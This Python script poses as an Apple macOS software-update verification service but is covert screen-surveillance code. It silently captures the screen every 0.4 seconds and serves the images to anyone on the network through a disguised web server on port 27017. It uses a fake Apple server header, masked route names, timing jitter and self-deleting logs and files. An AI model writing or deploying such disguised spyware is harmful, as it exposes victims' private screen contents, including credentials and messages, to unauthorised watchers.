#!/usr/bin/env python3
"""
com.apple.SoftwareUpdateCheck — macOS Update Verification Service
Internal only. Port 27017.
"""

import json
import os
import random
import signal
import socket
import subprocess
import sys
import threading
import time
import uuid

INSTALL_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE    = os.path.join(INSTALL_DIR, "update.log")
PID_FILE    = os.path.join(INSTALL_DIR, "update.pid")
FRAME_FILE  = "/tmp/com.apple.SoftwareUpdate.cache.jpg"
PORT        = 27017

_SRV = b"AppleHTTPD/2.4"
_START = time.time()

HTML = (
    b"<!DOCTYPE html><html><head>"
    b"<meta charset='UTF-8'>"
    b"<meta name='viewport' content='width=device-width,initial-scale=1'>"
    b"<title>System Monitor</title>"
    b"<style>"
    b"*{margin:0;padding:0;box-sizing:border-box}"
    b"body{margin:0;padding:0;background:#000;width:100vw;height:100vh;overflow:hidden;cursor:none}"
    b"img{width:100%;height:100%;object-fit:fill;display:block;position:fixed;top:0;left:0}"
    b"</style></head><body>"
    b"<img id='f' src='/progress/assets/screen.jpg'>"
    b"<script>"
    b"var el=document.getElementById('f');"
    b"var I=400,R=900;"
    b"function fs(){var d=document.documentElement;"
    b"(d.requestFullscreen||d.webkitRequestFullscreen||d.mozRequestFullScreen).call(d)}"
    b"document.addEventListener('click',fs);"
    b"function next(){"
    b"var img=new Image();"
    b"img.onload=function(){el.src=img.src;setTimeout(next,I)};"
    b"img.onerror=function(){setTimeout(next,R)};"
    b"img.src='/progress/assets/screen.jpg?'+Date.now()}"
    b"el.onload=function(){fs();next()};"
    b"el.onerror=function(){setTimeout(next,R)};"
    b"</script></body></html>"
)


def _hdrs(ctype: bytes, clen: int) -> bytes:
    return (
        b"HTTP/1.1 200 OK\r\n"
        b"Server: " + _SRV + b"\r\n"
        b"Content-Type: " + ctype + b"\r\n"
        b"Content-Length: " + str(clen).encode() + b"\r\n"
        b"X-Request-ID: " + uuid.uuid4().hex[:16].encode() + b"\r\n"
        b"X-Content-Type-Options: nosniff\r\n"
        b"Cache-Control: no-store\r\n"
        b"Connection: close\r\n\r\n"
    )


def _404(conn: socket.socket) -> None:
    conn.sendall(
        b"HTTP/1.1 404 Not Found\r\n"
        b"Server: " + _SRV + b"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
    )
    conn.close()


def _serve_frame(conn: socket.socket) -> None:
    time.sleep(random.uniform(0, 0.12))  # timing jitter
    try:
        with open(FRAME_FILE, "rb") as fh:
            frame = fh.read()
    except OSError:
        conn.sendall(
            b"HTTP/1.1 503 Service Unavailable\r\n"
            b"Server: " + _SRV + b"\r\nRetry-After: 1\r\nConnection: close\r\n\r\n"
        )
        conn.close()
        return
    conn.sendall(_hdrs(b"image/jpeg", len(frame)) + frame)
    conn.close()


def _serve_status(conn: socket.socket) -> None:
    age = -1.0
    try:
        age = round(time.time() - os.path.getmtime(FRAME_FILE), 2)
    except OSError:
        pass
    payload = json.dumps({
        "service":  "com.apple.SoftwareUpdateCheck",
        "status":   "ok" if 0 <= age < 2.0 else "degraded",
        "uptime_s": round(time.time() - _START, 1),
        "cache_age": age,
    }).encode()
    conn.sendall(_hdrs(b"application/json", len(payload)) + payload)
    conn.close()


def _handle(conn: socket.socket) -> None:
    try:
        raw = b""
        conn.settimeout(5.0)
        while b"\r\n\r\n" not in raw:
            chunk = conn.recv(1024)
            if not chunk:
                return
            raw += chunk
        first = raw.split(b"\r\n")[0].decode(errors="replace")
        path = first.split(" ")[1].split("?")[0] if " " in first else "/"

        if path == "/progress/assets/screen.jpg":
            _serve_frame(conn)
        elif path == "/update/status":
            _serve_status(conn)
        elif path in ("/frame", "/health", "/stream", "/api/v1/display/preview",
                      "/api/v1/system/status"):
            _404(conn)   # old routes dead
        else:
            conn.sendall(_hdrs(b"text/html; charset=utf-8", len(HTML)) + HTML)
            conn.close()
    except Exception:
        try: conn.close()
        except: pass


def _capture(log_fh) -> None:
    """Native resolution screencapture — no resize, sharpest text."""
    tmp = FRAME_FILE + ".tmp"
    while True:
        try:
            r = subprocess.run(
                ["screencapture", "-x", "-t", "jpg", tmp],
                capture_output=True, timeout=4
            )
            if r.returncode == 0 and os.path.getsize(tmp) > 0:
                os.replace(tmp, FRAME_FILE)
        except Exception as e:
            log_fh.write(f"[capture] {e}\n")
            log_fh.flush()
        time.sleep(0.4)


def main() -> None:
    with open(PID_FILE, "w") as fh:
        fh.write(str(os.getpid()))

    for f in [FRAME_FILE, FRAME_FILE + ".raw", FRAME_FILE + ".tmp"]:
        try: os.remove(f)
        except FileNotFoundError: pass

    log_fh = open(LOG_FILE, "a")

    def _cleanup(signum=None, frame=None) -> None:
        for f in [FRAME_FILE, FRAME_FILE + ".raw", FRAME_FILE + ".tmp",
                  PID_FILE, LOG_FILE]:
            try: os.remove(f)
            except: pass
        try: log_fh.close()
        except: pass
        sys.exit(0)

    signal.signal(signal.SIGTERM, _cleanup)
    signal.signal(signal.SIGINT, _cleanup)

    threading.Thread(target=_capture, args=(log_fh,), daemon=True).start()

    deadline = time.time() + 12
    while not os.path.exists(FRAME_FILE):
        if time.time() > deadline:
            break
        time.sleep(0.2)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(32)

    while True:
        try:
            conn, _ = srv.accept()
            threading.Thread(target=_handle, args=(conn,), daemon=True).start()
        except OSError:
            break


if __name__ == "__main__":
    main()
